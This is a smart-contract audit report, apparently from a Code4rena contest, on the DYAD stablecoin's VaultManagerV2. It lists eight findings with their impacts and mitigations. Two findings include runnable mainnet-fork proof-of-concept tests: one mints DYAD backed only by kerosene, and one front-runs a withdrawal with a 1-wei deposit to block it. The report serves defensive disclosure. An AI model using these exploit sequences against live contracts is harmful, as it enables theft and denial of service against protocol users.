# H-01 Dyad can be minted against kerosene collateral only and not being backed by at least $1 of exogenous collateral
Each DYAD stablecoin is expected to be backed by at least $1 of exogenous collateral. This surplus absorbs the collateral’s volatility, keeping DYAD fully backed in all conditions. This requirement is [checked when minting dyad](https://github.com/code-423n4/2024-04-dyad/blob/cd48c684a58158de444b24854ffd8f07d046c31b/src/core/VaultManagerV2.sol#L165) and when [making withdraws](https://github.com/code-423n4/2024-04-dyad/blob/cd48c684a58158de444b24854ffd8f07d046c31b/src/core/VaultManagerV2.sol#L150):
```solidity
// VaultManagerV2

function mintDyad(
    uint    id,
    uint    amount,
    address to
  )
    external 
    isDNftOwner(id)
{
  uint newDyadMinted = dyad.mintedDyad(address(this), id) + amount;
  if (getNonKeroseneValue(id) < newDyadMinted)     revert NotEnoughExoCollat(); // <-----------------------
  dyad.mint(id, to, amount);
  if (collatRatio(id) < MIN_COLLATERIZATION_RATIO) revert CrTooLow(); 
  emit MintDyad(id, amount, to);
}

function withdraw(
  uint    id,
  address vault,
  uint    amount,
  address to
) 
  public
  isDNftOwner(id)
{
  if (idToBlockOfLastDeposit[id] == block.number) revert DepositedInSameBlock();
  uint dyadMinted = dyad.mintedDyad(address(this), id);
  Vault _vault = Vault(vault);
  uint value = amount * _vault.assetPrice() 
                  * 1e18 
                  / 10**_vault.oracle().decimals() 
                  / 10**_vault.asset().decimals();
  if (getNonKeroseneValue(id) - value < dyadMinted) revert NotEnoughExoCollat(); // <-----------------------
  _vault.withdraw(id, to, amount);
  if (collatRatio(id) < MIN_COLLATERIZATION_RATIO)  revert CrTooLow(); 
}
```
The checks use `getNonKeroseneValue` to get the USD value of all deposited exogenous collaterals by the DNft:
```solidity
function getNonKeroseneValue(
  uint id
) 
  public 
  view
  returns (uint) 
{
  uint totalUsdValue;
  uint numberOfVaults = vaults[id].length(); 
  for (uint i = 0; i < numberOfVaults; i++) {
    Vault vault = Vault(vaults[id].at(i));
    uint usdValue;
    if (vaultLicenser.isLicensed(address(vault))) {
      usdValue = vault.getUsdValue(id);        
    }
    totalUsdValue += usdValue;
  }
  return totalUsdValue;
}
```
The function reads the list of exogenous vaults deposited by the DNft via the variable `vaults`, and this variable is updated when a DNft adds a vault through [add](https://github.com/code-423n4/2024-04-dyad/blob/cd48c684a58158de444b24854ffd8f07d046c31b/src/core/VaultManagerV2.sol#L67-L78) function:
```solidity
function add(
  uint    id,
  address vault
) 
  external
  isDNftOwner(id)
{
  if (vaults[id].length() >= MAX_VAULTS) revert TooManyVaults();
  if (!vaultLicenser.isLicensed(vault))  revert VaultNotLicensed();
  if (!vaults[id].add(vault))            revert VaultAlreadyAdded();
  emit Added(id, vault);
}
```
The issue is that the `add` function is only checking if the provided `vault` is licensed or not, and **it does not check if the vault is really an exogenous vault or not**.

This enables a DNft to add a kerosene vault as an exogenous vault, and thus when minting dyad, the `getNonKeroseneValue` will be looping through kerosene vaults and not through exogenous vaults, **causing the minted dyad to be backed by kerosene and not by exogenous tokens**

Notice that this attack is possible because `vaultLicenser` can license bounded/unbounded kerosene vaults, as [demonstrated](https://github.com/code-423n4/2024-04-dyad/blob/cd48c684a58158de444b24854ffd8f07d046c31b/script/deploy/Deploy.V2.s.sol#L95) by the deploy script
## Impact
Dyad can be minted against kerosene collateral only and not being backed by at least $1 of exogenous collateral

## Proof of Concept
The following test demonstrates the explained vulnerability. The test forks the Ethereum mainnet, makes the upgrade using the deploy script, and demonstrates the vulnerability.

Copy and paste the following contracts in `/test`

`Base2Test.sol`:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.17;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {DeployV2, Contracts} from "../script/deploy/Deploy.V2.s.sol";
import {Parameters} from "../src/params/Parameters.sol";
import {DNft} from "../src/core/DNft.sol";
import {Dyad} from "../src/core/Dyad.sol";
import {Licenser} from "../src/core/Licenser.sol";
import {VaultManager} from "../src/core/VaultManager.sol";
import {Vault} from "../src/core/Vault.sol";
import {Payments} from "../src/periphery/Payments.sol";
import {OracleMock} from "./OracleMock.sol";
import {ERC20Mock} from "./ERC20Mock.sol";
import {IAggregatorV3} from "../src/interfaces/IAggregatorV3.sol";
import {ERC20} from "@solmate/src/tokens/ERC20.sol";
import {VaultManagerV2}         from "../src/core/VaultManagerV2.sol";
import {VaultWstEth}            from "../src/core/Vault.wsteth.sol";
import {KerosineManager}        from "../src/core/KerosineManager.sol";
import {UnboundedKerosineVault} from "../src/core/Vault.kerosine.unbounded.sol";
import {BoundedKerosineVault}   from "../src/core/Vault.kerosine.bounded.sol";
import {Kerosine}               from "../src/staking/Kerosine.sol";
import {KerosineDenominator}    from "../src/staking/KerosineDenominator.sol";
contract Base2Test is Test, Parameters {
  
    Kerosine kerosine;
    Licenser vaultLicenser;
    VaultManagerV2 vaultManagerV2;
    Vault ethVault;
    VaultWstEth wstEthVault;
    KerosineManager kerosineManager;
    UnboundedKerosineVault unboundedKerosineVault;
    BoundedKerosineVault boundedKerosineVault;
    KerosineDenominator kerosineDenominator;
    DNft dNFT =  DNft(MAINNET_DNFT);

    address multiSig = 0xDeD796De6a14E255487191963dEe436c45995813;
    address alice = 0xD2ce17b0566dF31F8020700FBDA6521D28d98C22; // has 15 WETH balance;
    address bob = 0x8BdDD807A2b61722660351864A3cF355A5503293; // has 4 WETH balance;
    uint aliceDNFT;
    uint bobDNFT;
  function setUp() public {
    vm.createSelectFork("https://eth.llamarpc.com", 19691300);
    Contracts memory contracts = new DeployV2().run();

    kerosine = contracts.kerosene;
    vaultLicenser = contracts.vaultLicenser;
    vaultManagerV2 = contracts.vaultManager;
    ethVault = contracts.ethVault;
    wstEthVault = contracts.wstEth;
    kerosineManager = contracts.kerosineManager;
    boundedKerosineVault = contracts.boundedKerosineVault;
    unboundedKerosineVault = contracts.unboundedKerosineVault;
    kerosineDenominator = contracts.kerosineDenominator;

    vm.prank(vaultLicenser.owner());
    vaultLicenser.add(address(boundedKerosineVault));

    aliceDNFT = dNFT.mintNft{value: 1 ether}(alice);
    bobDNFT =   dNFT.mintNft{value: 1 ether}(bob);

    vm.prank(0xDeD796De6a14E255487191963dEe436c45995813);
    Licenser(0xd8bA5e720Ddc7ccD24528b9BA3784708528d0B85).add(address(vaultManagerV2));
  }
}
```
`VaultManagerV2.t.sol`:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.17;

import "forge-std/console.sol";
import {Base2Test} from "./Base2Test.sol";
import {Dyad} from "../src/core/Dyad.sol";
import {Kerosine} from "../src/staking/Kerosine.sol";

contract VaultManagerV2Test is Base2Test {

  function test_minting_dyad_against_kerosene_only() public {
    // Funding the exogenous vaults with some amount so TVL is greater than DYAD total supply
    deal(address(MAINNET_WETH), address(ethVault), 5 ether);
    deal(address(MAINNET_WSTETH), address(wstEthVault), Dyad(MAINNET_DYAD).totalSupply());
    
    deal(MAINNET_KEROSENE, alice, 1 ether);

    vm.startPrank(alice);

    // The root of vulnerability: Adding unbounded kerosine vault as exogenous vault
    vaultManagerV2.add(aliceDNFT, address(unboundedKerosineVault)); 
    Kerosine(MAINNET_KEROSENE).approve(address(vaultManagerV2), 1 ether);
    vaultManagerV2.deposit(aliceDNFT, address(unboundedKerosineVault), 1 ether);

    // Minting dyad against the unbounded kerosene only. No exogenous token is deposited!
    vaultManagerV2.mintDyad(aliceDNFT, 1 ether, alice);

    uint mintedDyad = Dyad(vaultManagerV2.dyad()).mintedDyad(address(vaultManagerV2), aliceDNFT);
    assertEq(1 ether, mintedDyad);
  }
}
```
```bash
forge test --mt test_minting_dyad_against_kerosene_only

[PASS] test_minting_dyad_against_kerosene_only() (gas: 774511)
```
## Tools used
Manual review
## Recommended Mitigation Steps
Consider adding a check to verify if the provided vault in `add` function is really an exogenous vault or not. A separate contract that **only keeps track of exogenous vaults** must be used to make the check

# H-02 Current flash loan protection implementation may allow malicious actors to DoS withdraw/redeemDyad operations on `VaultManagerV2`
In [VaultManagerV2::withdraw](https://github.com/code-423n4/2024-04-dyad/blob/4a987e536576139793a1c04690336d06c93fca90/src/core/VaultManagerV2.sol#L134-L143), there is a protection from flash loans by checking if there's an already deposit by the dNFT id on the same block:
```solidity
function withdraw(
    uint    id,
    address vault,
    uint    amount,
    address to
) 
    public
    isDNftOwner(id)
{
    if (idToBlockOfLastDeposit[id] == block.number) revert DepositedInSameBlock();
    // rest of the code
  }
```
The `idToBlockOfLastDeposit` is updated when a [deposit](https://github.com/code-423n4/2024-04-dyad/blob/4a987e536576139793a1c04690336d06c93fca90/src/core/VaultManagerV2.sol#L119-L131) is made:
```solidity
function deposit(
    uint    id,
    address vault,
    uint    amount
) 
    external 
    isValidDNft(id)
{
    idToBlockOfLastDeposit[id] = block.number;
    // rest of the code
  }
```
We can see that `deposit` has the modifier `isValidDNft` because someone can deposit on behalf of another dNFT. However, a malicious actor can abuse this modifier by front-running withdrawal requests to deposit on behalf of the DNft making the withdraw, so `idToBlockOfLastDeposit` will be set for that DNft, and thus, the flash loan protection mechanism will prevent the withdrawal request. 

**The `deposit` does not enforce any minimum value, so a malicious actor depositing `1 wei` value is enough to perform the DoS.**

Consider the following example that is demonstrated by a runnable PoC (numbers are kept small for simplicity):
1. Alice has DNFT of id 1 and already minted `1` dyad.
2. Alice decides to redeem her dyad to get back her collateral, so she initiates a tx calling `redeemDyad`
3. Bob notices Alice's tx on the mempool, he front-runs the transaction and deposits `1 wei` wETH on behalf of Alice, passing her DNft ID to the `deposit` function. Now, `idToBlockOfLastDeposit[1]` which corresponds to Alice is set to the current block number
4. Alice's transaction (`redeemDyad`) will revert due to the flash loan protection

## Impact

- Malicious actors can exploit the current implementation of flash loan protection to prevent others from making withdraws or redeems.

## Proof of Concept
The following test demonstrates the described example above. Copy and paste the following contracts to `/test`:
1. `Base2Test.col`:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.17;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {DeployV2, Contracts} from "../script/deploy/Deploy.V2.s.sol";
import {Parameters} from "../src/params/Parameters.sol";
import {DNft} from "../src/core/DNft.sol";
import {Dyad} from "../src/core/Dyad.sol";
import {Licenser} from "../src/core/Licenser.sol";
import {VaultManager} from "../src/core/VaultManager.sol";
import {Vault} from "../src/core/Vault.sol";
import {Payments} from "../src/periphery/Payments.sol";
import {OracleMock} from "./OracleMock.sol";
import {ERC20Mock} from "./ERC20Mock.sol";
import {IAggregatorV3} from "../src/interfaces/IAggregatorV3.sol";
import {ERC20} from "@solmate/src/tokens/ERC20.sol";
import {VaultManagerV2}         from "../src/core/VaultManagerV2.sol";
import {VaultWstEth}            from "../src/core/Vault.wsteth.sol";
import {KerosineManager}        from "../src/core/KerosineManager.sol";
import {UnboundedKerosineVault} from "../src/core/Vault.kerosine.unbounded.sol";
import {BoundedKerosineVault}   from "../src/core/Vault.kerosine.bounded.sol";
import {Kerosine}               from "../src/staking/Kerosine.sol";
import {KerosineDenominator}    from "../src/staking/KerosineDenominator.sol";
contract Base2Test is Test, Parameters {
  
    Kerosine kerosine;
    Licenser vaultLicenser;
    VaultManagerV2 vaultManagerV2;
    Vault ethVault;
    VaultWstEth wstEthVault;
    KerosineManager kerosineManager;
    UnboundedKerosineVault unboundedKerosineVault;
    BoundedKerosineVault boundedKerosineVault;
    KerosineDenominator kerosineDenominator;
    DNft dNFT =  DNft(MAINNET_DNFT);

    address alice = 0xD2ce17b0566dF31F8020700FBDA6521D28d98C22; // has 15 WETH balance;
    address bob = 0x8BdDD807A2b61722660351864A3cF355A5503293; // has 4 WETH balance;
    uint aliceDNFT;
    uint bobDNFT;
  function setUp() public {
    vm.createSelectFork("https://eth.llamarpc.com", 19691300);
    Contracts memory contracts = new DeployV2().run();

    kerosine = contracts.kerosene;
    vaultLicenser = contracts.vaultLicenser;
    vaultManagerV2 = contracts.vaultManager;
    ethVault = contracts.ethVault;
    wstEthVault = contracts.wstEth;
    kerosineManager = contracts.kerosineManager;
    boundedKerosineVault = contracts.boundedKerosineVault;
    unboundedKerosineVault = contracts.unboundedKerosineVault;
    kerosineDenominator = contracts.kerosineDenominator;

    vm.prank(vaultLicenser.owner());
    vaultLicenser.add(address(boundedKerosineVault));

    aliceDNFT = dNFT.mintNft{value: 1 ether}(alice);
    bobDNFT =   dNFT.mintNft{value: 1 ether}(bob);

    vm.prank(0xDeD796De6a14E255487191963dEe436c45995813);
    Licenser(0xd8bA5e720Ddc7ccD24528b9BA3784708528d0B85).add(address(vaultManagerV2));
  }
}
```
2. `VaultManagerV2.t.sol`:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.17;

import "forge-std/console.sol";
import {Base2Test} from "./Base2Test.sol";
import {ERC20Mock} from "./ERC20Mock.sol";
import {IWETH} from "../src/interfaces/IWETH.sol";
import {Licenser} from "../src/core/Licenser.sol";
contract VaultManagerV2Test is Base2Test {
error NotLicensed();

  function test_malicious_actor_can_DoS_redeem_or_withdraw() public {
    // ============================== Preconditions ==============================
    vm.startPrank(alice);
    vaultManagerV2.add(aliceDNFT, address(ethVault));
    IWETH(MAINNET_WETH).approve(address(vaultManagerV2), 1 ether);
    vaultManagerV2.deposit(aliceDNFT, address(ethVault), 1 ether);
    // 1 ETH ~ $3074 at the forked block. 150% collateral is satisfied
    vaultManagerV2.mintDyad(aliceDNFT, 1 ether, alice);
    vm.roll(block.number + 1);

    // ============================== Attack ==============================
    // Alice wants to redeem her dyad or withdraw her colalteral
    // Bob notices the transaction so he decides to front-runs it and deposit on behalf of her
    vm.startPrank(bob);
    IWETH(MAINNET_WETH).approve(address(vaultManagerV2), 1); // @audit 1 wei is enough
    vaultManagerV2.deposit(aliceDNFT, address(ethVault), 1);
    vm.stopPrank();

    vm.startPrank(alice);
    bytes4 expectedErrorSelector = bytes4(keccak256("DepositedInSameBlock()"));
    vm.expectRevert(abi.encodeWithSelector(expectedErrorSelector));
    vaultManagerV2.redeemDyad(aliceDNFT, address(ethVault), 1 ether, alice); // @audit Alice wansn't able to make the redeem
  }
}
```
> **NOTE**: Notice that `Base2Test::setUp` is forking from Ethereum mainnet using an RPC, make sure to set your proper Mainnet RPC
```bash
forge test --mt test_malicious_actor_can_DoS_redeem_or_withdraw

[PASS] test_malicious_actor_can_DoS_redeem_or_withdraw() (gas: 294705)
```
## Tools Used
Manual review
## Recommended Mitigation Steps
There are two possible mitigations, and it is up to the dev team to decide the proper one
1. Restrict a minimum deposit value when making a deposit. The minimum value should disincentivize malicious actors from exploiting the attack.
2. Replace the modifier `isValidDNft` with `isDNftOwner` on `deposit`

# H-03 The liquidation process does not take into account the Kerosene tokens
## Impact
Liquidators call [liquidate](https://github.com/code-423n4/2024-04-dyad/blob/4a987e536576139793a1c04690336d06c93fca90/src/core/VaultManagerV2.sol#L205-L228) function to liquidate DNfts with a collateral ratio lower than `MIN_COLLATERIZATION_RATIO`. The function moves the exogenous vaults assets held by the liquidated DNft to a DNft specified by the liquidator:
```solidity
uint numberOfVaults = vaults[id].length();
for (uint i = 0; i < numberOfVaults; i++) {
  Vault vault      = Vault(vaults[id].at(i));
  uint  collateral = vault.id2asset(id).mulWadUp(liquidationAssetShare);
  vault.move(id, to, collateral);
}
emit Liquidate(id, msg.sender, to);
```
The issue here is that the logic presented in the function does not take into account the Kerosene held by the liquidated DNft as it is not moved and stays in the balance of the liquidated DNft. This kerosene left will not be included in the `20% bonus` as stated by the docs:
> The liquidator burns a quantity of DYAD equal to the target Note’s DYAD minted balance, and in return receives an equivalent value **plus a 20% bonus of the target Note’s backing collateral**.


## Proof of Concept
Consider the following example:
- Alice had minted Dyad, and her 150% collateralization ratio is divided as follows:
  - 100% of exogenous collateral (weth, wsteth...etc)
  - The extra 50% is of Kerosene tokens
- At some point, Alice's collateral value drops below the minimum. A liquidation must happen
- When bob liquidates Alice, he will receive only the 100% collateral of the exogenous tokens, and the extra 50% of Kerosene tokens will be kept with Alice balance (he did not't receive the 20% bonus)

## Tools Used
Manual review
## Recommended Mitigation Steps
Consider adding a logic in the `liquidate` function to handle the Kerosene balance of the liquidated DNft

# H-04 `VaultManagerV2::withdraw` implementation is not compatible with unbounded kerosine tokens withdraws

## Impact
DNfts can deposit to kerosene and non-keroesene vaults as collateral to mint dyad tokens. Vaults need just to be licensed, and added by the DNft.

DNfts can then withdraw their collateral by calling [withdraw](https://github.com/code-423n4/2024-04-dyad/blob/4a987e536576139793a1c04690336d06c93fca90/src/core/VaultManagerV2.sol#L134-L153) function:
```solidity
function withdraw(
  uint    id,
  address vault,
  uint    amount,
  address to
) 
  public
  isDNftOwner(id)
{
  if (idToBlockOfLastDeposit[id] == block.number) revert DepositedInSameBlock();
  uint dyadMinted = dyad.mintedDyad(address(this), id);
  Vault _vault = Vault(vault);
  uint value = amount * _vault.assetPrice() 
                * 1e18 
                / 10**_vault.oracle().decimals() 
                / 10**_vault.asset().decimals();
  if (getNonKeroseneValue(id) - value < dyadMinted) revert NotEnoughExoCollat(); // <----- check 1
  _vault.withdraw(id, to, amount);
  if (collatRatio(id) < MIN_COLLATERIZATION_RATIO)  revert CrTooLow(); // <----- check 2
}
```
We can see that two checks need to pass for any withdrawal: 

1. The value of non-kerosene tokens should always be greater or equal to the number of dyad tokens minted
2. The total collateral value should always be above 150% of the DYAD minted balance

We are more interested in the first check. The issue here is that this check is not necessary if the DNft is withdrawing unbounded kerosine and will cause problems because the first check will **always subtract non-kerosene value from the value being withdrawn**, even tho the DNft is withdrawing unbounded kerosine tokens. **So, if the DNft had allocated only a 100% collateral ratio of non-kerosne tokens, withdrawing unbounded kerosine tokens will always revert because of the first check**
## Proof of Concept
Consider the following example:
- Alice has minted x amounts of dyad tokens and her collateralization ratio is 160% divided as follows:
  - 100% from `stETH`
  - the extra 60% from `unboundedKerosine`
- Alice wants to withdraw from her collateral `10%` of unbounded kerosine, so she calls the `withdraw` function. The collateralization ratio is still satisfied after the withdraw (she would have `150%` collateral ratio) so the second check should pass. And the first check should also pass as she still has `100%` collateral of non-kerosine tokens--stETH.
- When the `withdraw` function starts the execution, it will reach [this check](https://github.com/code-423n4/2024-04-dyad/blob/4a987e536576139793a1c04690336d06c93fca90/src/core/VaultManagerV2.sol#L150) in which it will subtract the non-kerosene value (100% collateral) from the withdrawn amount (10%) in which the result will certainly be below `dyadMinted`, causing the transaction to revert
## Tools used
Manual review

## Recommended Mitigation Steps

Consider distinguishing between withdrawing non-kerosene tokens and unbounded kerosene tokens. Below is a suggestion:
1. If the DNft is withdrawing unbounded kerosine token: remove check 1 and keep only check 2 
2. If the DNft is withdrawing non-kerosene tokens: keep both checks.

# H-05 Manual migration to new vaults will cause significant amount of dyad to be burned
## Impact
After making the upgrade using the deploy script, new `weth` and `wsteth` vaults will be created, as demonstrated by the [deploy script](https://github.com/code-423n4/2024-04-dyad/blob/cd48c684a58158de444b24854ffd8f07d046c31b/script/deploy/Deploy.V2.s.sol#L48-L65):
```solidity
// weth vault
Vault ethVault = new Vault(
    vaultManager,
    ERC20        (MAINNET_WETH),
    IAggregatorV3(MAINNET_WETH_ORACLE)
);

// wsteth vault
VaultWstEth wstEth = new VaultWstEth(
    vaultManager, 
    ERC20        (MAINNET_WSTETH), 
    IAggregatorV3(MAINNET_CHAINLINK_STETH)
);

KerosineManager kerosineManager = new KerosineManager();

kerosineManager.add(address(ethVault));
kerosineManager.add(address(wstEth));
```
`weth` and `wsteth` vaults already exist and already have deposits by DNfts, and as mentioned by the sponsor, funds migration need to happen

The issue is that the migration would not happen efficiently, because the sponsors said that DNfts will be required to migrate funds manually. And to do so, **they need to burn all their Dyad to withdraw all of their deposits** (because of collateralization ratio check). The existing total supply of dyad is `625967400000000000000000` (at the moment of writing the report), so for all DNfts to migrate after the upgrade, **`625967.4e18` of dyad needs to be burned**, which is **inefficient at all and will have impacts on the economical value of dyad**.

The `VaultManagerV2` offers no possibility to migrate funds as the only way to deposit to the vaults (and thus, updating the `id2asset` state on the underlying vault) is by calling [deposit](https://github.com/code-423n4/2024-04-dyad/blob/cd48c684a58158de444b24854ffd8f07d046c31b/src/core/VaultManagerV2.sol#L119-L131) function on `VaultManagerV2`that requires a transfer of assets to the underlying vault, which makes sense for new deposits, but it is not relevant for DNfts wanting to migrate their existing deposits from previous vaults to the new vaults.

## Recommended Mitigation Steps
Consider adding a new deposit function that is restricted by admins to move deposits from old vaults to new vaults to avoid the need of manual migration by DNfts. Below is a suggestion for a new function:
```solidity
function migrate(
    uint    id,
    address vault,
    uint    amount
  ) 
    external 
    isValidDNft(id)
    onlyAdmin
{
    Vault _vault = Vault(vault);
    _vault.deposit(id, amount);
}
```

# H-06 DNfts can still deposit unbounded kerosine when TVL is less than Dyad total supply, in which the unbounded kerosine tokens become unwithdrawable for an undefined amount of time

## Impact
The asset price of unbounded kerosene tokens depends on the total USD value of all exogenous collateral in the protocol (TVL) as seen by the [UnboundedKerosineVault::assetPrice](https://github.com/code-423n4/2024-04-dyad/blob/4a987e536576139793a1c04690336d06c93fca90/src/core/Vault.kerosine.unbounded.sol#L50-L68) function:
```solidity
function assetPrice() 
  public 
  view 
  override
  returns (uint) {
    uint tvl;
    address[] memory vaults = kerosineManager.getVaults();
    uint numberOfVaults = vaults.length;
    for (uint i = 0; i < numberOfVaults; i++) {
      Vault vault = Vault(vaults[i]);
      tvl += vault.asset().balanceOf(address(vault)) 
              * vault.assetPrice() * 1e18
              / (10**vault.asset().decimals()) 
              / (10**vault.oracle().decimals());
    }
    uint numerator   = tvl - dyad.totalSupply();
    uint denominator = kerosineDenominator.denominator();
    return numerator * 1e8 / denominator;
}
```
DNfts can deposit unbounded or bounded kerosine tokens as collateral by calling [VaultManagerV2::deposit](https://github.com/code-423n4/2024-04-dyad/blob/4a987e536576139793a1c04690336d06c93fca90/src/core/VaultManagerV2.sol#L119-L131). The issue is that the function does not prevent DNfts from depositing unbounded Kerosine tokens when the TVL value goes below the total Dyad supply. In such situation, DNfts can not withdraw their unbounded kerosene or redeem their dyad tokens because both functions [call](https://github.com/code-423n4/2024-04-dyad/blob/4a987e536576139793a1c04690336d06c93fca90/src/core/VaultManagerV2.sol#L146C34-L146C44) `UnboundedKerosineVault::assetPrice`, and `assetPrice` will [revert if TVL is less than dyad's total supply](https://github.com/code-423n4/2024-04-dyad/blob/4a987e536576139793a1c04690336d06c93fca90/src/core/Vault.kerosine.unbounded.sol#L65) because of underflow:
```solidity
uint numerator   = tvl - dyad.totalSupply();
```
This issue will be more likely to happen a lot after the upgrade using the deploy script, as both `ethVault` and `wstEth` vaults will be newly deployed and the total supply of dyad is already `632967400000000000000000`.

The amount of time for the TVL value to become more than dyad's total supply(and similarly, the amount time for DNfts to be able to withdraw their unbounded kerosene tokens) is undefined and can not be known, as it depends on the total USD value of all exogenous collateral in the protocol.

In addition, when the TVL value is lower than dyad's total supply, **it is more secure to prevent any deposits of unbounded tokens as the value of these tokens themselves depends strongly on TVL being greater than dyad's total supply.**

## Recommended Mitigation Steps
Consider preventing deposits of unbounded tokens when `tvl < dyad.totalSupply()`


# M-01 Kerosene tokens can be included in the TVL calculation in `Vault.kerosine.unbounded`
## Impact
It is mentioned in the docs that the [TVL calculation](https://github.com/code-423n4/2024-04-dyad/blob/4a987e536576139793a1c04690336d06c93fca90/src/core/Vault.kerosine.unbounded.sol#L60-L64) in `Vault.kerosine.unbounded` should not include the kerosene itself:
> C: the total USD value of all exogenous collateral in the protocol (TVL). **Critically, this total does not include Kerosene itself**

If we examine the TVL calculation, we can see that the vaults included in the calculation are the ones returned by the `KerosineManager` contract:
```solidity
function assetPrice() 
    public 
    view 
    override
    returns (uint) {
      uint tvl;
      address[] memory vaults = kerosineManager.getVaults(); // <-----------------
      uint numberOfVaults = vaults.length;
      for (uint i = 0; i < numberOfVaults; i++) {
        Vault vault = Vault(vaults[i]);
        tvl += vault.asset().balanceOf(address(vault)) 
                * vault.assetPrice() * 1e18
                / (10**vault.asset().decimals()) 
                / (10**vault.oracle().decimals());
      }
      uint numerator   = tvl - dyad.totalSupply();
      uint denominator = kerosineDenominator.denominator();
      return numerator * 1e8 / denominator;
}
```
This indicates that `KerosineManager` should manage **always non-kerosene** vaults. However, in `VaultManagerV2` and according to the docs also, it is clearly visible that a DNft can add a kerosene vault to deposit into it as collateral, and **the vault should be licensed from `KeroseneManager` contract**:
```solidity
// VaultManagerV2.sol

function addKerosene(
  uint    id,
  address vault
) 
  external
  isDNftOwner(id)
{
  if (vaultsKerosene[id].length() >= MAX_VAULTS_KEROSENE) revert TooManyVaults();
  if (!keroseneManager.isLicensed(vault))                 revert VaultNotLicensed(); // @audit The vault should be licensed from the keroseneManager
  if (!vaultsKerosene[id].add(vault))                     revert VaultAlreadyAdded();
  emit Added(id, vault);
}
```
And for the kerosene vault to be licensed by the `KeroseneManager`, it must be added to its vaults list:
```solidity
// KerosineManager.sol

function add(
  address vault
) 
  external 
  onlyOwner
{
  if (vaults.length() >= MAX_VAULTS) revert TooManyVaults();
  if (!vaults.add(vault))            revert VaultAlreadyAdded();
}

function isLicensed(
  address vault
) 
  external 
  view 
  returns (bool) {
    return vaults.contains(vault);
}
```
This feature (users can add kerosine vaults and deposit to them as collateral) **is contradictory** with the fact that TVL calculation should not include kerosene vaults because the `KerosineManager` is used in both actions.

The issue is not with the feature *depositing Kerosine tokens as collateral*, but **it is with the fact that `KerosineManager` is used in both licensing Kerosine vaults and in the TVL calculation**
## Proof of Concept
If the owner licenses one kerosine vault in `KerosineManager` so DNfts can deposit into them, TVL calculation will include kerosine tokens.
## Tools used
Manual review
## Recommended Mitigation Steps
Consider adding a separate contract to manage licensing kerosene vaults for deposits

# M-02 There is no motivation for liquidators to liquidate DNfts with collateralization ratio dropping below 100%
## Impact
Liquidators call [liquidate](https://github.com/code-423n4/2024-04-dyad/blob/4a987e536576139793a1c04690336d06c93fca90/src/core/VaultManagerV2.sol#L205-L228) function to liquidate DNfts with a collateral ratio lower than `MIN_COLLATERIZATION_RATIO`. 
**The liquidator burns a quantity of DYAD equal to the target Note’s DYAD minted balance**, and in return **receives an equivalent value** plus a 20% bonus of the target Note’s backing collateral
```solidity
function liquidate(
  uint id,
  uint to
) 
  external 
  isValidDNft(id)
  isValidDNft(to)
{
  uint cr = collatRatio(id);
  if (cr >= MIN_COLLATERIZATION_RATIO) revert CrTooHigh();
  dyad.burn(id, msg.sender, dyad.mintedDyad(address(this), id)); // @audit the liquidator burns the dyad

  uint cappedCr               = cr < 1e18 ? 1e18 : cr;
  uint liquidationEquityShare = (cappedCr - 1e18).mulWadDown(LIQUIDATION_REWARD);
  uint liquidationAssetShare  = (liquidationEquityShare + 1e18).divWadDown(cappedCr); // @audit asset share that includes the same value of the burned dyad + extra 20% if available

  uint numberOfVaults = vaults[id].length();
  for (uint i = 0; i < numberOfVaults; i++) {
      Vault vault      = Vault(vaults[id].at(i));
      uint  collateral = vault.id2asset(id).mulWadUp(liquidationAssetShare);
      vault.move(id, to, collateral);
  }
  emit Liquidate(id, msg.sender, to);
}
```
The liquidator is always burning the total dyad balance of the DNft being liquidated. The issue here is if the collateralization ratio (`cr`) drops below 100%, there would be no incentivization for liquidators to liquidate the DNft because they will incur a loss as they will burn the whole DNft's dyad balance and only receive the value of the DNft's exogenous value which is not an equivalent value of what they burned.

## Proof of Concept
Consider the following example:
#### Preconditions
- The value of 1 ETH is `$1,500`
- Alice deposits `15 WETH` as collateral. Her exogenous collateral value is `$22,500`
- Alice mints `10,000` dyad. Her collateral ratio against the minted dyad is `225%`

#### The value of ETH drops to `$500`
- The exogenous collateral value of alice now is `$7,500`
- Alice already minted `10,000` dyad, but given her current exogenous value, her collateralization ratio becomes `75%`. Liquidation must happen

#### Attempting to liquidate Alice after the drop of ETH
Bob, the liquidator, attempts to liquidate alice:
- Bob will burn `10,000` dyad
- Since the collat ratio (`cr`) is `0.75e18` (75%), it is capped at `1e18` (100%). 
- `liquidationEquityShare` will equal zero and `liquidationAssetShare` will equal `1`
```solidity
dyad.burn(id, msg.sender, dyad.mintedDyad(address(this), id));

uint cappedCr               = cr < 1e18 ? 1e18 : cr;
uint liquidationEquityShare = (cappedCr - 1e18).mulWadDown(LIQUIDATION_REWARD);
uint liquidationAssetShare  = (liquidationEquityShare + 1e18).divWadDown(cappedCr);
```

Because `liquidationAssetShare` is `1`, this means that the value Bob will receive is the same as Alice's exogenous value.
```solidity
uint collateral = vault.id2asset(id).mulWadUp(liquidationAssetShare);
vault.move(id, to, collateral);
```
So, Bob would burn `10,000` dyad and would receive only `$7,500`. Thus, there is no incentivization to liquidate Alice


## Recommended Mitigation Steps
Solving this issue is tricky. One possible solution is to subsidize the losses with kerosene tokens, but it is not a long-lasting solution as the total supply of Kerosene is finite.

What matters in the liquidation is to burn the Dyad that is no longer backed by at least $1 of exogenous tokens. One possible effective solution is to add an admin-restricted function that can burn dyad tokens of DNfts having a collateral ratio lower than 100%. So even if bots are not incentivized to liquidate the DNft, the admins can call the function and burn the Dyad.